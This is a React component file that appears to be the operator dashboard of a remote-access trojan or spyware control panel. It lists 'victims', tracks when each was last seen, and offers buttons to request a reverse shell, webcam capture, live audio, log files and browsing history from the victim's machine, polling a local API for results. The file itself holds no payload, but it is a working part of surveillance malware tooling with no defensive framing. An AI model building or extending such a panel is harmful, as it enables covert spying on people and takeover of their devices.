import React, { useState, useEffect } from 'react';
import { useParams, Link } from 'react-router-dom';
import { fetchVictims } from '../utils/api';
import ActionButton from './ActionButton';
import Sidebar from './Sidebar';
import RequestModal from './RequestModal';
import { Terminal, Camera, Mic, FileText, History } from 'lucide-react';

const buttons = [
  { label: 'Reverse shell', icon: Terminal, url: '/reverse-shell' },
  { label: 'Webcam', icon: Camera, url: '/webcam' },
  { label: 'Live audio', icon: Mic, url: '/live-audio' },
  { label: 'Log files', icon: FileText, url: '/log-files' },
  { label: 'Browsing history', icon: History, url: '/browsing-history' },
];

export default function VictimPage() {
  const { _id } = useParams();
  const [victim, setVictim] = useState(null);
  const [requests, setRequests] = useState([]);
  const [selectedRequest, setSelectedRequest] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);

  const fetchAndUpdateVictim = () => {
    fetchVictims().then(victims => {
      const foundVictim = victims.find(v => v._id === _id);
      setVictim(foundVictim || null);
    });
  };

  const fetchRequests = async () => {
    try {
      const response = await fetch(`http://localhost:3001/api/client/requests/${_id}`);
      if (!response.ok) {
        throw new Error('Failed to fetch requests');
      }
      const data = await response.json();
      setRequests(data);
    } catch (error) {
      console.error('Error fetching requests:', error);
    }
  };

  const updateData = () => {
    fetchAndUpdateVictim();
    fetchRequests();
  };

  useEffect(() => {
    updateData();

    const interval = setInterval(updateData, 10 * 1000);

    return () => clearInterval(interval);
  }, [_id]);

  const handleRequestClick = (request) => {
    setSelectedRequest(request);
    setIsModalOpen(true);
  };

  const closeModal = () => {
    setIsModalOpen(false);
    setSelectedRequest(null);
  };

  if (!victim) {
    return <div className='bg-gray-900'>Victim not found!</div>;
  }

  const isRecentlySeen = () => {
    const lastSeenDate = new Date(victim.lastSeen);
    const now = new Date();
    return (now - lastSeenDate) <= 10 * 60 * 1000;
  };

  return (
    <div className="flex min-h-screen bg-gray-900 text-white">
      <div className="flex-grow p-4 sm:p-6 md:p-8 overflow-y-auto">
        <h1 className="text-2xl sm:text-3xl font-bold mb-6 text-center">{victim.title}</h1>
        <div className="w-full h-96 bg-gray-800 rounded-lg shadow-md mb-6 flex items-center justify-center overflow-hidden">
          <img src={victim.img} alt={victim.title} className="w-full h-full object-cover" />
        </div>
        <div className="flex items-center justify-center mb-4">
          <span
            className={`mr-4 mt-1 h-5 w-5 rounded-full ${isRecentlySeen() ? 'bg-green-500' : 'bg-red-500'
              }`}
          ></span>
          <h3 className={`text-center text-2xl ${isRecentlySeen() ? 'text-green-500' : 'text-red-500'}`}>Last seen: {String(new Date(victim.lastSeen).toLocaleString())}</h3>
        </div>

        <h2 className="text-xl font-semibold mb-4">Request data:</h2>
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-4 mb-6">
          {buttons.map((button, index) => (
            <ActionButton key={index} {...button} />
          ))}
        </div>

        <Link to="/" className="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300 ease-in-out inline-block mb-8">
          Back to Dashboard
        </Link>
      </div>
      <div className="w-1/3 min-w-[300px] max-w-[400px] h-screen overflow-hidden">
        <Sidebar victim={victim} requests={requests} onRequestClick={handleRequestClick} />
      </div>
      {isModalOpen && selectedRequest && (
        <RequestModal request={selectedRequest} onClose={closeModal} />
      )}
    </div>
  );
}

